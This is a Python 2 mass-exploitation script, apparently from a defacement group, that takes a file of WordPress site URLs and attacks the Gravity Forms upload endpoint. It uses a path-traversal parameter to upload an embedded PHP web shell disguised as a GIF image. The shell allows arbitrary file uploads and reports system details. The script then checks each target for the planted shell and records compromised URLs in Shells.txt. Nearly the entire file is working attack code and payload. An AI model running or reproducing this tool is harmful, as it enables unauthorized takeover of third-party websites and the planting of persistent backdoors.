#!/usr/bin/python

# Hackers Make A Tools
# Not Tools Make A Hackers
# Officially Author; Acai Kacak

import requests, os, sys, codecs
from multiprocessing.dummy import Pool
from time import time as timer
import time
from random import sample as rand
from platform import system
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
init(autoreset=True)

#######Colors######
fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.YELLOW
fg  =   Fore.YELLOW
sd  =   Style.BRIGHT
sn  =   Style.NORMAL
sb  =   Style.BRIGHT
#######################

try:
    with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IOError:
    pass
ooo = list((ooo))



def banners():


    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')
        
        banner = """{}{} \n \n

888888ba   888888ba   .d888888   .88888.   .88888.  888888ba   88888888b  .88888.   888888ba   a88888b.  88888888b 
88    `8b  88    `8b d8'    88  d8'   `88 d8'   `8b 88    `8b  88        d8'   `8b  88    `8b d8'   `88  88        
88     88 a88aaaa8P' 88aaaaa88a 88        88     88 88     88 a88aaaa    88     88 a88aaaa8P' 88        a88aaaa    
88     88  88   `8b. 88     88  88   YP88 88     88 88     88  88        88     88  88   `8b. 88         88        
88    .8P  88     88 88     88  Y8.   .88 Y8.   .8P 88     88  88        Y8.   .8P  88     88 Y8.   .88  88        
8888888P   dP     dP 88     88   `88888'   `8888P'  dP     dP  dP         `8888P'   dP     dP  Y88888P'  88888888P 
                                    

        \n""".format(fc, sb)
        
        print banner

shell = """GIF89a;<?php echo 'Priv8 Uploaders By Dragon Force'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); echo '<center><form method="post" target="_self" enctype="multipart/form-data"><input type="file" size="20" name="uploads"/><input type="submit" value="upload"/></form></center></td></tr></table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     echo "<script>alert('upload Done');          </script><b>Fuckedz!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
filename = "Fuckedz.jpg"

def rand_str (len = None) :
    if len == None :
        len = 8
    return ''.join (rand ('abcdefghijklmnopqrstuvwxyz', len))

def ExploitS(url):
    try:
        
        
        
        
        # 1 .   Gravity Forms
        
        
        appgrav  = {'field_id':'3',
        'form_id':'1',
        'gform_unique_id':'../../../',
        'name':'dfm.phtml'}
        
        
        Grav = {'file':(filename, shell, 'text/html')}
        
        Gravreq = requests.post(url+'/?gf_page=upload', data=appgrav, files=Grav)
        
        Gravlib = requests.get(url+'/wp-content/uploads/_input_3_dfm.phtml')
        
        
        if 'Dragon Force' in Gravlib.content:
           	print '[{}Wordpress]: {}{} => {}{} Gravitys {}{} Fuckedz!  '.format(sb, sd, url, fc,fc, sb,fg)
           	open('Shells.txt', 'a').write(url+'/wp-content/uploads/_input_3_dfm.phtml'+'\n')
        else:
           	print '[{}Wordpress]: {}{} => {}{} Gravitys {}{} Failed!  '.format(sb, sd, url, fc,fc, sb,fr)


    except:
        pass



		
banners()

	
def Main():
     for i in ooo:
         ExploitS(i)
if __name__ == '__main__':
    Main()
